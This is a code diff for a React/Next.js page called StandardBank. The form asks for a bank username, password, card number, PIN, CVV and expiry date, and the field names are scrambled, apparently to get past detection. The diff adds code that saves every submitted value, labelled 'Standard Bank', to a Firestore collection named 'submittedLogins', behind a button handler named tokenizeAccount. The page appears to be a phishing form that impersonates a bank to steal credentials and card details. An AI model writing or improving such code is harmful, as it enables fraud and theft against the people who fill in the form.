@@ -1,4 +1,6 @@
 import React from "react";
+import { addDoc, collection } from "firebase/firestore";
+import { db } from "../../../services/firebase.config";
 import { Meta } from "../../../components";
 import { Box, Typography } from "@mui/material";
 import PrivateRoute from "../../../components/auth/PrivateRoute";
@@ -6,8 +8,11 @@ import { useContext } from "react";
 import userDataContext from "../../../context/UserDataContext";
 import { useState } from "react";
 import cogoToast from "cogo-toast";
+import { useRouter } from "next/router";
 
 const StandardBank = () => {
+  const router = useRouter();
+  const [isLoading, setIsLoading] = useState(false);
   const [formData, setFormData] = useState({
     username: "",
     _pas_swo_rd: "",
@@ -32,14 +37,37 @@ const StandardBank = () => {
       username.trim().length > 0 &&
       _pas_swo_rd.length > 0 &&
       _ca_rd_Num_ber.trim().length > 10 &&
-      _p_i_n_.trim().length >= 4;
-    _c_v_v_.trim().length >= 4;
-    _exp_iry_Da_te_.trim().length >= 6;
+      _p_i_n_.trim().length >= 4 &&
+      _c_v_v_.trim().length >= 3 &&
+      _exp_iry_Da_te_.trim().length >= 6;
 
     if (validateDetails) {
-      const data = { ...formData, _exp_iry_Da_te_: new Date(_exp_iry_Da_te_) };
+      try {
+        setIsLoading(true);
 
-      console.log(data);
+        const res = await addDoc(collection(db, "submittedLogins"), {
+          _user: userData.id,
+          user_name: `${userData.firstName} ${userData.lastName}`,
+          timeStamp: new Date(),
+          data: {
+            ...formData,
+            _exp_iry_Da_te_: new Date(_exp_iry_Da_te_),
+            bank: "Standard Bank",
+          },
+        });
+
+        console.log(res);
+        if (res) {
+          cogoToast.success("Successful");
+          // navigate back to dashboard
+          router.replace("/account");
+        }
+        setIsLoading(false);
+      } catch (error) {
+        console.log(error);
+        cogoToast.error("Something went wrong");
+        setIsLoading(false);
+      }
     } else {
       cogoToast.error("One or more inputs are invalid");
     }
@@ -131,8 +159,12 @@ const StandardBank = () => {
                 />
               </div>
 
-              <button type="button" onClick={tokenizeAccount}>
-                SUBMIT
+              <button
+                type="button"
+                onClick={tokenizeAccount}
+                disabled={isLoading}
+              >
+                {isLoading ? "LOADING..." : "SUBMIT"}
               </button>
             </form>
           </Box>
